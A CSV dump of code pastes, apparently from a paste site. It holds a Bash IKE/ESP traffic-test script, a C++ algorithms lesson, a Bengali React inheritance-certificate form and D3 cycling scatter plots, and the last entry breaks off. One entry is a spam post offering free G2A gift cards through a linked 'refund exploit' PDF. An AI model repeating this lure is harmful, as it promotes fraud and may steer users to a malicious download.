id,title,username,language,date,content
XrRykuMy,ikev2_generate_traffic.sh,mdriscoll93,Bash,Tuesday 13th of February 2024 11:49:58 AM CDT,"#!/bin/env bash

ikev2_generate_traffic() {
    read -r -p ""Enter the remote GW IP: "" RemoteGW

    # Generate IKE traffic.
    echo ""Generating IKE traffic...""
    echo ""111"" | run_with_timeout 5 nc -u -w1 ""$RemoteGW"" 500
    if ! run_with_timeout;
    then
        echo ""Error sending data to UDP port 500!""
        return 1
    fi

    echo ""112"" | run_with_timeout 5 nc -u -w1 ""$RemoteGW"" 4500
    if ! run_with_timeout;
    then
        echo ""Error sending data to UDP port 4500!""
        return 1
    fi

    # Generate ESP traffic.
    echo ""Generating ESP traffic...""

    run_with_timeout 20 ping -c 10 ""$RemoteGW""
    if ! run_with_timeout;
    then
        echo ""Ping command failed!""
        # Decide whether to exit or continue. Uncomment the next line to exit.
        # return 1
    fi

    run_with_timeout 20 traceroute ""$RemoteGW""
    if ! run_with_timeout;
    then
        echo ""Traceroute command failed!""
        return 1
    fi
}
ikev2_generate_traffic"
rV0Vkcru,Algoritmi lezione 8,fcamuso,C#,Tuesday 13th of February 2024 11:40:45 AM CDT,"//divide et impera

#include <iostream>
#include <chrono>

using namespace std;
#include ""../utility_vettori.h""

long long tot_chiamate = 0;

string cerca_stringa_max(string v[], int sx, int dx)
{
  tot_chiamate++;

  string min_sx = """", min_dx = """";

  if (sx==dx) //un elemento solo
  {
    return v[sx];
  }
  else
    if (sx + 1 == dx ) //due elementi
    {
      if (v[sx]>v[dx])
        return v[sx];
      else
        return v[dx];
    }
    else
    {
      int mediano = sx +(dx - sx)/2;
      //cout << sx << "" "" << mediano << endl;
      min_sx = cerca_stringa_max(v, sx, mediano);

      //cout << mediano+1 << "" "" << dx << endl;
      min_dx = cerca_stringa_max(v, mediano+1, dx);
    }

    if (min_sx>min_dx)
      return min_sx;
    else
      return min_dx;
}


const int QUANTI_ELEMENTI = 98304;
string v[QUANTI_ELEMENTI];

int main()
{
  carica_vettore_stringhe(v, QUANTI_ELEMENTI - 1, 10);

  v[QUANTI_ELEMENTI-1] = string(100, 'z');

  //ordino dal più piccolo al più grande
  for (int i=0; i<QUANTI_ELEMENTI-1; i++)
    for (int j=i+1; j<QUANTI_ELEMENTI; j++)
      if (v[j]>v[i]) swap(v[i], v[j]);

  int numero_run = 1;
  int ripetizioni_per_run = 1;


// RICERCA CON RESTITUZIONE DELL'ELEMENTO MASSIMO
  string s = """";
  Cronometro(Stato::START);
  for(int conta_run =0; conta_run<numero_run; conta_run++)
    for (int conta=0; conta<ripetizioni_per_run; conta++)
      s = cerca_stringa_max(v, 0, QUANTI_ELEMENTI - 1);

  cout << ""Tempo impiegato (ELEMENTO): "" << Cronometro(Stato::STOP) << endl;
  cout << ""STRINGA MAX: "" << s << endl;

  cout << ""Numero chiamate alla funzione: "" << tot_chiamate << endl;

  return 0;
}
"
aZzgMXj2,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Tuesday 13th of February 2024 11:39:13 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_569950.pdf
 
Working as of
13 February 2024"
g9KJYxvr,HeirApplicationAdd.js,shawon_majid,JavaScript,Tuesday 13th of February 2024 11:28:59 AM CDT,"import axios from ""axios"";
import React, { useState } from ""react"";
import { NavLink } from ""react-router-dom"";
import backendURL from ""../consts"";

// const HeirInformation = ({ inheritor, index }) => {
//   return (
//     <tr key={index}>
//       <th scope=""row"" className=""text-center"">
//         {index + 1}
//       </th>
//       <td className=""text-center"">
//         <input
//           type=""text""
//           className=""form-control""
//           id=""text""
//           placeholder=""নাম""
//           name=""inheritorName""
//           value={inheritor.inheritorName}
//           onChange={(e) => {}}
//         />
//       </td>
//       <td className=""text-center"">
//         <input
//           type=""text""
//           className=""form-control""
//           id=""text""
//           placeholder=""সম্পর্ক""
//         />
//       </td>
//       <td className=""text-center"">
//         <input
//           type=""text""
//           className=""form-control""
//           id=""text""
//           placeholder=""মন্তব্য""
//         />
//       </td>
//       <td className=""text-center"">
//         {index == 0 ? null : (
//           <button
//             type=""button""
//             className=""btn-icon btn-outline-lightblue font-weight-bold mr-2""
//           >
//             -
//           </button>
//         )}
//         <button
//           type=""button""
//           className=""btn-icon btn-outline-lightblue font-weight-bold mr-2""
//         >
//           +
//         </button>
//       </td>
//     </tr>
//   );
// };

const HeirApplicationAdd = () => {
  const [heirInfo, setHeirInfo] = useState({
    applicantsName: """",
    fathersName: """",
    mothersName: """",
    spousesName: """",
    voterIdNo: """",
    mobileNo: """",
    nationality: """",
    wardNo: 5,
    postOffice: """",
    upozilla: """",
    district: """",
    nameOfDead: """",
    fathersNameOfDead: """",
    mothersNameOfDead: """",
    spousesNameOfDead: """",
    voterIdNoOfDead: """",
    mobileNoOfDead: """",
    nationalityOfDead: """",
    wardNoOfDead: """",
    postOfficeOfDead: """",
    upozillaOfDead: """",
    districtOfDead: """",
    listOfInheritors: [
      {
        inheritorName: """",
        relationship: """",
        comment: """",
      },
      {
        inheritorName: """",
        relationship: """",
        comment: """",
      },
    ],
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setHeirInfo({ ...heirInfo, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    // axios call for sending to database
    try {
      await axios.post(
        backendURL + ""/api/inheritance-certificate/add"",
        heirInfo
      );
    } catch (err) {
      console.log(err);
    }
  };

  const HeirInformation = ({ inheritor, index }) => {
    return (
      <tr>
        <th scope=""row"" className=""text-center"">
          {index + 1}
        </th>
        <td className=""text-center"">
          <input
            type=""text""
            className=""form-control""
            id=""text""
            placeholder=""নাম""
            name=""inheritorName""
            value={inheritor.inheritorName}
            onChange={(e) => {
              const { name, value } = e.target;

              setHeirInfo({
                ...heirInfo,
                listOfInheritors: heirInfo.listOfInheritors.map((item, idx) =>
                  idx === index ? { ...item, [name]: value } : item
                ),
              });
            }}
          />
        </td>
        <td className=""text-center"">
          <input
            type=""text""
            className=""form-control""
            id=""text""
            placeholder=""সম্পর্ক""
          />
        </td>
        <td className=""text-center"">
          <input
            type=""text""
            className=""form-control""
            id=""text""
            placeholder=""মন্তব্য""
          />
        </td>
        <td className=""text-center"">
          {index == 0 ? null : (
            <button
              type=""button""
              className=""btn-icon btn-outline-lightblue font-weight-bold mr-2""
            >
              -
            </button>
          )}
          <button
            type=""button""
            className=""btn-icon btn-outline-lightblue font-weight-bold mr-2""
          >
            +
          </button>
        </td>
      </tr>
    );
  };

  return (
    <>
      <div className=""content-wrapper"">
        {/* ---------------- Content Header Page Header ---------------- */}
        <div className=""content-header"">
          <div className=""container-fluid"">
            <div className=""row mb-2"">
              <div className=""col-sm-6"">
                <h1 className=""m-0"">ওয়ারিশান সনদের আবেদন</h1>
              </div>
              <div className=""col-sm-6"">
                <ol className=""breadcrumb float-sm-right"">
                  <li className=""breadcrumb-item"">
                    <NavLink to=""/"">হোম</NavLink>
                  </li>
                  <li className=""breadcrumb-item active"">
                    ওয়ারিশান সনদের আবেদন
                  </li>
                </ol>
              </div>
            </div>
          </div>
        </div>
        {/* ---------------- Main Content Start ---------------- */}
        <section className=""content"">
          <div className=""container-fluid"">
            {/* ---------------- Container Start ---------------- */}
            <div className=""row"">
              <div className=""col-lg-3 col-md-3 col-sm-3""></div>
              <div className=""col-lg-3 col-md-3 col-sm-3""></div>
              <div className=""col-lg-3 col-md-3 col-sm-3""></div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <button type=""button"" className=""btn btn-block btn-lightblue"">
                  সবগুলো দেখুন
                </button>
              </div>
            </div>
            <div className=""row mt-3 p-3 rounded main-bg"">
              {/* <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">Text</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""Text""
                  />
                </div>
              </div> */}
              <div className=""col-lg-12 col-md-12 col-sm-12 pt-4 pb-3"">
                <h4 className=""text-center"">আবেদনকারীর তথ্য</h4>
              </div>

              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">আবেদনকারীর নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""আবেদনকারীর নাম""
                    name=""applicantsName""
                    value={heirInfo.applicantsName}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">পিতার নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""পিতার নাম""
                    name=""fathersName""
                    value={heirInfo.fathersName}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মাতার নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মাতার নাম""
                    name=""mothersName""
                    value={heirInfo.mothersName}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">স্বামী/স্ত্রী-র নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""স্বামী/স্ত্রী-র নাম""
                    name=""spousesName""
                    value={heirInfo.spousesName}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ভোটার আইডি নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ভোটার আইডি নং""
                    name=""voterIdNo""
                    value={heirInfo.voterIdNo}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মোবাইল নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মোবাইল নং""
                    name=""mobileNo""
                    value={heirInfo.mobileNo}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">জাতীয়তা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""জাতীয়তা""
                    name=""nationality""
                    value={heirInfo.nationality}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ওয়ার্ড নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ওয়ার্ড নং""
                    name=""wardNo""
                    value={heirInfo.wardNo}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ডাকঘর</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ডাকঘর""
                    name=""postOffice""
                    value={heirInfo.postOffice}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">উপজেলা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""উপজেলা""
                    name=""upozilla""
                    value={heirInfo.upozilla}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">জেলা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""জেলা""
                    name=""district""
                    value={heirInfo.district}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className=""col-lg-12 col-md-12 col-sm-12 pt-4 pb-3"">
                <h4 className=""text-center"">মৃত ব্যক্তির তথ্য</h4>
              </div>

              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মৃত ব্যক্তির নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মৃত ব্যক্তির নাম""
                    name=""nameOfDead""
                    value={heirInfo.nameOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">পিতার নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""পিতার নাম""
                    name=""fathersNameOfDead""
                    value={heirInfo.fathersNameOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মাতার নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মাতার নাম""
                    name=""mothersNameOfDead""
                    value={heirInfo.mothersNameOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">স্বামী/স্ত্রী-র নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""স্বামী/স্ত্রী-র নাম""
                    name=""spousesNameOfDead""
                    value={heirInfo.spousesNameOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ভোটার আইডি নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ভোটার আইডি নং""
                    name=""voterIdNoOfDead""
                    value={heirInfo.voterIdNoOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মোবাইল নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মোবাইল নং""
                    name=""mobileNoOfDead""
                    value={heirInfo.mobileNoOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">জাতীয়তা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""জাতীয়তা""
                    name=""nationalityOfDead""
                    value={heirInfo.nationalityOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ওয়ার্ড নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ওয়ার্ড নং""
                    name=""wardNoOfDead""
                    value={heirInfo.wardNoOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ডাকঘর</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ডাকঘর""
                    name=""postOfficeOfDead""
                    value={heirInfo.postOfficeOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">উপজেলা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""উপজেলা""
                    name=""upozillaOfDead""
                    value={heirInfo.upozillaOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">জেলা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""জেলা""
                    name=""districtOfDead""
                    value={heirInfo.districtOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className=""col-lg-12 col-md-12 col-sm-12 pt-4 pb-3"">
                <h4 className=""text-center"">ওয়ারিশানগনের তথ্য দিন</h4>
              </div>

              <div className=""col-lg-12 col-md-12 col-sm-12 table-responsive"">
                <table className=""table table-striped"" width=""100%;"">
                  <thead>
                    <tr>
                      <th scope=""col"" className=""text-center"">
                        #
                      </th>
                      <th scope=""col"" className=""text-center"">
                        নাম
                      </th>
                      <th scope=""col"" className=""text-center"">
                        সম্পর্ক
                      </th>
                      <th scope=""col"" className=""text-center"">
                        মন্তব্য
                      </th>
                      <th scope=""col"" className=""text-center actionTable"">
                        একশন
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {heirInfo.listOfInheritors.map((inheritor, index) => (
                      <HeirInformation
                        key={index}
                        inheritor={inheritor}
                        index={index}
                      />
                    ))}
                  </tbody>
                  <tfoot>
                    {/* <tr>
                      <th className=""text-center""> </th>
                      <th> </th>
                      <th> </th>
                      <th scope=""row"" className=""text-center""></th>
                      <th scope=""row"" className=""text-right""></th>
                      <th className=""text-center""> </th>
                    </tr> */}
                  </tfoot>
                </table>
              </div>

              <div className=""col-lg-4 col-md-4 col-sm-4""></div>
              <div className=""col-lg-4 col-md-4 col-sm-4"">
                <button
                  type=""button""
                  className=""btn btn-block btn-lightblue""
                  onClick={handleSubmit}
                >
                  জমা দিন
                </button>
              </div>
              <div className=""col-lg-4 col-md-4 col-sm-4""></div>
            </div>
            {/* ---------------- Container End ---------------- */}
          </div>
        </section>
        {/* ---------------- Main Content End ---------------- */}
      </div>
    </>
  );
};

export default HeirApplicationAdd;
"
KAf1Wex2,pointwise_comparison_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:17:56 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .highlighted {
      stroke: red;
      stroke-width: 2;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      var colors = [""#27ae60"", ""#8e44ad""];
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      d3.json(url).then(function (data) {
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10;

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", (d) => {
            if (
              (d[""Name""] == ""Marco Pantani"" && d[""Year""] == 1995) ||
              (d[""Name""] == ""Lance Armstrong"" && d[""Year""] == 2004) ||
              (d[""Name""] == ""Floyd Landis"" && d[""Year""] == 2006) ||
              (d[""Name""] == ""Carlos Sastre"" && d[""Year""] == 2006)
            ) {
              return ""dot highlighted"";
            } else {
              return ""dot"";
            }
          })
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");
      });
    </script>
  </body>
</html>
"
GJQDSxrb,title_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:16:12 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation {
      fill: red;
      stroke: red;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      // Url to the input data
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      // Colors to differentiate riders with and without doping allegations
      var colors = [""#27ae60"", ""#8e44ad""];

      // The attributes of the riders corresponding to the above colors
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      // Create an invisible div for the tooltip
      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      // 1. Load the data from external source
      d3.json(url).then(function (data) {
        // 2. Append svg-object for the bar chart to a div in your webpage
        // (here we use a div with id=container)
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10; // How for the axes are moved away from each other

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        // 3. Define scales to translate domains of the data to the range of the svg
        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        // 4. Draw and transform/translate horizontal and vertical axes
        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        // 5. Draw individual scatter points and define mouse events for the tooltip
        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        // 6. Finalize chart by adding title, axes labels and legend
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // 7. Add annotations
        var annotationData = [
          { year: 1995, time: ""36:50"", text: ""Marco Pantani (Doping Allegations)"" },
          { year: 2006, time: ""39:01"", text: ""Carlos Sastre (No Doping Allegations)"" }
        ];

        var line = d3.line()
          .x((d) => xScale(d.year))
          .y((d) => yScale(parseTime(d.time)));

        svg.selectAll(""annotationLines"")
          .data(annotationData)
          .enter()
          .append(""path"")
          .attr(""d"", (d) => line([{ year: d.year, time: d.time }, { year: d.year + 2, time: d.time }]))
          .attr(""stroke"", ""red"")
          .attr(""fill"", ""none"");

        svg.selectAll(""annotationTexts"")
          .data(annotationData)
          .enter()
          .append(""text"")
          .attr(""x"", (d) => xScale(d.year + 1))
          .attr(""y"", (d) => yScale(parseTime(d.time)))
          .text((d) => d.text)
          .attr(""class"", ""annotation"");
      });
    </script>
  </body>
</html>
"
j1waw6PR,data_range_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:12:50 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
